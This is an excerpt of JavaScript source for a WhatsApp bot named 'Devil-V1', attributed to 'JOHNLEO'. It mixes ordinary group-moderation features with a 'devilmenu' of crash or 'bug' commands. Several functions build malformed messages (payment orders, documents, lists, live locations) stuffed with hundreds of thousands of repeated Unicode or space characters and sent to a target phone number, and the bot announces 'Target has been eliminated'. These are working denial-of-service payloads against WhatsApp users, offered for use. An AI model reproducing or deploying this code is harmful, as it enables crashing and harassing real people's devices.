...
await ryozingod.updateProfileStatus(`👺 Devil - Client By : 𝑱𝑶𝑯𝑵𝑳𝑬𝑶 || 👹 Runtime : ${uptime}`)
...
const moment = require('moment-timezone');
const time = moment().tz("Africa/Nigeria").format("HH:mm:ss");
let ucapanWaktu
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝕯𝖊𝖛𝖎𝖑̿╮⭑ ☠️⃰͜͡؜𝑱𝑶𝑯𝑵𝑳𝑬𝑶⭐️᜴ # ˢᵃᵐˢཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
if (!isBotAdmins) return joreply(`${mess.botAdmin}, _To kick people who send group links_`)
...
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Don't send group links in the group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}
...
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Don't send wa.me links to this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
...
ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n${pushname} Has been kicked for sending viruses in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
...
if (!isBotAdmins) return
bvl = `\`\`\`「 Profanity Detected 」\`\`\`\n\nAdmin is free to use harsh words`
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
...
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Profanity Detected 」\`\`\`\n\n${pushname} Please do not use harsh words in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
...
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Detected 」\`\`\`\n\nAdmins and Bot Contributors are free to send any links `
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
...
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n${pushname} Don't send YouTube video links to this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
...
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n${pushname} Don't send YouTube channel links to this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
...
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n${pushname} Don't send Instagram links to this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
...
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n${pushname} Don't send Facebook links to this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
...
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n${pushname} Don't send telegram links to this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
...
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n${pushname} Don't send tiktok links to this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
...
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Twitter Link Detected 」\`\`\`\n\n${pushname} Don't send twitter links to this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
...
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmins are free to send any links`
if (isAdmins) return joreply(bvl)
if (mek.key.fromMe) return joreply(bvl)
if (isDeveloper) return joreply(bvl)
await ryozingod.sendMessage(m.chat,
...
/*ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n${pushname} Don't send links to this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝕯𝖊𝖛𝖎𝖑╮⭑ ☠️⃰͜͡؜𝑱𝑶𝑯𝑵𝑳𝑬𝑶⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `✳️᜴࿆͆̿᷍𝕯𝖊𝖛𝖎𝖑⭑ ☠️⃰͜͡؜𝑱𝑶𝑯𝑵𝑳𝑬𝑶⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        ...
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b176eab43d957563ab914.jpg" } }, { upload: ryozingod.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "𝕯𝖊𝖛𝖎𝖑➯𝖂𝖊𝖇➊"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝕯𝖊𝖛𝖎𝖑👺╮⭑ ☠️⃰͜͡؜𝑱𝑶𝑯𝑵𝑳𝑬𝑶⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝕯𝖊𝖛𝖎𝖑👺╮⭑ ☠️⃰͜͡؜𝑱𝑶𝑯𝑵𝑳𝑬𝑶⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
if (!isGroup && !isDeveloper && db.data.settings[botNumber].onlygrub ) {
	if (command){
return joreply(` Halo ${m.pushName}! Because We Want to Reduce Spam, Please Use Bots in Chat Groups!`)
}
}
...
◈ 𝕿𝖞𝖕𝖊 : Case
◈ 𝕾𝖙𝖆𝖙𝖚𝖘 : Ready
◈ 𝕸𝖔𝖉𝖊 : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
◈ 𝖀𝖘𝖊𝖗 : ${Object.keys(db.data.users).length}
◈ 𝕻𝖗𝖊𝖋𝖎𝖝 : Single 
...
💀${prefix}devilmenu 💀
😈${prefix}allmenu 👺
☠️${prefix}changemenu button/non ☠️
👹${prefix}owner 👺
...
"footer": {
"text": "⿻   Devil Execution Vault   ⿻"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "single_select",
"buttonParamsJson": `{ "title": "⿻𝑱𝑶𝑯𝑵𝑳𝑬𝑶⿻", "sections": [{ "title": "# !-Choose One Of Them", "highlight_label": "🌏General Commands🗨️", "rows": [{ "header": "ALL COMMAND", "title": "Show All Command", "id": ".allmenu" }, { "header": "Owner", "title": "Displays Owner Number", "id": ".owner" }, { "header": "Bot Info", "title": "Displays Information About Bots", "id": ".botstatus" }] }, { "title": "🦠 SpeCiaL - ComManD ❌", "highlight_label": " #SpeCial ", "rows": [{ "header": "bugl - Menu", "title": "displays all special commands", "id": ".devilmenu" }] }] }`
},
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐂𝐡𝐚𝐧𝐧𝐞𝐥\",\"url\":\"https://whatsapp.com/channel/0029VaZsyQ21XqudOTjyG30Z\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaZsyQ21XqudOTjyG30Z\"}"
}
],
"messageParamsJson": ""
}
...
◈ ${prefix}ma-gic 2548###
◈ ${prefix}sor-ry 2548###
◈ ${prefix}devil-bug 2548###
◈ ${prefix}suck-it 2548###
◈ ${prefix}bug-24j 2548###
◈ ${prefix}devil-kill 2548###
◈ ${prefix}samsung-chace 2548###
◈ ${prefix}samsun 2548###
◈ ${prefix}vios-unli 2548###
◈ ${prefix}dead-ios 2548###
◈ ${prefix}ios-devil 2548#|amount
◈ ${prefix}devil-ios 2548#|amount
...
"forwardedNewsletterMessageInfo": {
"newsletterJid": '0@newsletter',
"newsletterName": 'By Devil Execution Vault',
"serverMessageId": 1
},
},
"header": {
...
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"⿻𝑱𝑶𝑯𝑵𝑳𝑬𝑶⿻\nI think You are a gay😋😘\",\"id\":\".terkentod\"}"
}
],
"messageParamsJson": ""
}
...
//=================================================//
case 'sc': case 'script': {
joreply(`🌤𝐈 𝐊𝐍𝐎𝐖 𝐘𝐎𝐔 𝐑𝐄𝐀𝐋𝐋𝐘 𝐍𝐄𝐄𝐃 𝐓𝐇𝐈𝐒 𝐒𝐂𝐑𝐈𝐏𝐓, 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐓𝐇𝐄 𝐃𝐄𝐕𝐈𝐋 😈 [𝐉𝐎𝐇𝐍𝐋𝐄𝐎] 𝐅𝐎𝐑 𝐈𝐓.

❕𝐎𝐖𝐍𝐄𝐑 : https://api.whatsapp.com/send?phone=+2348027387246
❗𝐆𝐑𝐎𝐔𝐏 : https://chat.whatsapp.com/Hk4jZg8HMoH1auW2NAKazX
...
let namaown = `Owner Johnleo`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ 𝑱𝑶𝑯𝑵𝑳𝑬𝑶༑ ]]\nX-WA-BIZ-NAME: [[ ༑ 𝑱𝑶𝑯𝑵𝑳𝑬𝑶 ༑ ]]\nEND:VCARD`,
}
...
//=================================================//
case 'runtime':
                let pinga = ` ◈ ━━━━━━━ ⸙ 𝕯𝖊𝖛𝖎𝖑-𝖁1👺 ⸙ ━━━━━━━ ◈𝖗 Is Active${runtime(process.uptime())}`
                ryozingod.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            ...
                            title: `𝕯𝖊𝖛𝖎𝖑-𝖁1`,
                            body: `𝑱𝑶𝑯𝑵𝑳𝑬𝑶`,
                            thumbnailUrl: 'https://telegra.ph/file/eb599bcccaa6d41b53604.jpg',
...
case 'ping': {
  ...
  const pingMsg = await ryozingod.sendMessage(m.chat, { text: '*𝕯𝖊𝖛𝖎𝖑-𝖁1*' });
 ...
 await ryozingod.relayMessage(m.chat, {
      protocolMessage: {
        ...
        type: 14,
        editedMessage: {
          conversation: `*𝕯𝖊𝖛𝖎𝖑-𝖁1👺 𝚂𝙿𝙴𝙴𝙳 ➟* *${new Date() - startTime}* 𝙼𝚂`
        }
      }
    }, {});
  } 
...
joreply(`Successfully blocked user`)
} else {
...
//=================================================//
case 'iniryo' : {
ryozingod.sendMessage(m.chat, { text: `_Its 𝕯𝖊𝖛𝖎𝖑-𝖁1_` }, { quoted: m })
}
break
//=================================================//
case 'terkentod' : {
ryozingod.sendMessage(m.chat, { text: `Call me 𝕯𝖊𝖛𝖎𝖑-𝖁1` }, { quoted: m })
}
break
//=================================================//
case "emojimix": {
...
let teks = `*GENERATED BY 𝕯𝖊𝖛𝖎𝖑-𝖁1*`
...
await sleep(2000)
ryozingod.sendMessage(args[0] + "@s.whatsapp.net", {image: {url: `https://telegra.ph/file/eb599bcccaa6d41b53604.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
}
}
break
//=================================================//
...
joreply("Sukses Via Nomer")
await sleep(2000)
ryozingod.sendMessage(targetNumber, {image: {url: `https://telegra.ph/file/eb599bcccaa6d41b53604.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
} else {
...
image: { url: 'https://telegra.ph/file/eb599bcccaa6d41b53604.jpg' },
...
let disk = "4024"
let email = username + "zxv@sweetrabit.ml"
akunlo = "https://telegra.ph/file/eb599bcccaa6d41b53604.jpg" 
if (!u) return
let d = (await ryozingod.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
...
🔐 Password: ${password}
🔗 Url: ${domain}`
ryozingod.sendMessage(u, { image: { url: 'https://telegra.ph/file/eb599bcccaa6d41b53604.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
...
message: {
  "interactiveMessage": {
    ...
    "footer": {
      "text": "𝕵𝖔𝖍𝖓𝖑𝖊𝖔 © Devil Execution Vault"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
  ...
  "interactiveMessage": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝑱𝑶𝑯𝑵𝑳𝑬𝑶⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝕯𝖊𝖛𝖎𝖑-𝖁1╮⭑ ☠️⃰͜͡؜𝑱𝑶𝑯𝑵𝑳𝑬𝑶⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝕵𝖔𝖍𝖓𝖑𝖊𝖔╮⭑ ☠️⃰͜͡؜𝑱𝑶𝑯𝑵𝑳𝑬𝑶⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
body: `⁗ ⋄Target down 💀🥹`,
previewType: "VIDEO",
sourceUrl: `༑ 𝑱𝑶𝑯𝑵𝑳𝑬𝑶💀𝕯𝖊𝖛𝖎𝖑-𝖁1⿻`,
mediaType: 1,
mediaUrl: 'https://whatsapp.com/channel/0029VaZsyQ21XqudOTjyG30Z'
}
},
text: '𝙏𝙖𝙧𝙜𝙚𝙩 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙚𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 𝘽𝙮 *𝕯𝖊𝖛𝖎𝖑-𝖁1👺* 𝘽𝙮  𝑱𝑶𝑯𝑵𝑳𝑬𝑶 '
}, {
quoted: m
})
}
